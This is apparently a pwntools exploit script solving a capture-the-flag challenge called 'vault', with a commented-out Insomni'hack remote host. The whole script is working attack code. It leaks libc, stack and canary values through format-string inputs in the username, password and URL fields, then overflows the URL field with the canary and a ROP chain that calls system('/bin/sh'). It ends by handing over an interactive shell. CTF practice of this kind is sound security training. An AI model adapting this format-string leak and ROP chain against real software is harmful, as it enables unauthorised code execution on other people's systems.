#!/bin/python
from pwn import *
exe = ELF('./vault_patched')
libc = ELF('./libc.so.6')
ld = ELF('./ld-2.35.so')
p = process(exe.path)
# p = remote("vaulty.insomnihack.ch",4556) 
context.terminal = ['alacritty','-e']
gdb.attach(p, gdbscript='''
# b*0x126f + 0x0000555555554000
#            b*0x129d + 0x0000555555554000
             b*0x12d0 + 0x0000555555554000
 # b*0x17ad + 0x0000555555554000
           # b*0x1479 + 0x0000555555554000
            # b*0x1501 + 0x0000555555554000
           ''')
p.sendlineafter(b'choice (1-5):',  b'1')
p.sendlineafter(b'Username:',  b'%141$p')
p.sendlineafter(b'Password:',  b'lmao%12$p')
p.sendlineafter(b'URL:',  b'%11$p')
p.sendlineafter(b'choice (1-5):',  b'4')
p.sendlineafter(b'to view',  b'0')
p.recvuntil(b'ername: ')
leak=p.recvuntil(b'lmao', drop=True)
leak_addr = int(leak.split(b'\n')[0],16)

leak_stack = int(p.recvuntil(b'\nUrl: ',drop=True), 16)
canary_leak = int(p.recvline(8),16)
log.info(f'canary_leak: {hex(canary_leak)}')
log.info(f'leak_addr: {hex(leak_addr)}')
log.info(f'leak_stack: {hex(leak_stack)}')
libc_base = leak_addr - 171408
libc_system =  libc_base +libc.sym['system']
bin_sh = libc_base + libc.search(b'/bin/sh').__next__() 
pop_rdi = libc_base + 0x000000000002a3e5
ret = libc_base + 173030
#write
rbp_view = leak_stack-1016-8
log.info(f'leak_stack: {hex(leak_stack)}')
log.info(f'libc_base: {hex(libc_base)}')
log.info(f'libc_system: {hex(libc_system)}')
log.info(f'bin_sh: {hex(bin_sh)}')
log.info(f'pop_rdi: {hex(pop_rdi)}')
# p.sendlineafter(b'choice (1-5):',  b'2')
payload = p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(libc_system)
p.sendlineafter(b'choice (1-5):',  b'1')
p.sendlineafter(b'Username:', b'a')
p.sendlineafter(b'Password:', b'a')
p.sendlineafter(b'URL:', b'a'*0x28 + p64(canary_leak) + b'a'*0x18 + payload)
# p.sendlineafter(b'entry to view ',b'0' )
# p.sendlineafter(b'Username:', b'b')
# p.sendlineafter(b'Password:',b'b')
# p.sendlineafter(b'URL:', b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
# p.sendlineafter(b'choice (1-5):',  b'1')
# p.sendlineafter(b'Username:', f'%{fake_rbp}c%12$n'.encode())
# p.sendlineafter(b'Password:', f'%{fake_rbp}c%12$n'.encode())
# p.sendlineafter(b'URL:', b'')
# p.sendlineafter(b'choice (1-5):',  b'4')
# p.sendlineafter(b'to view',  b'1')
p.interactive()
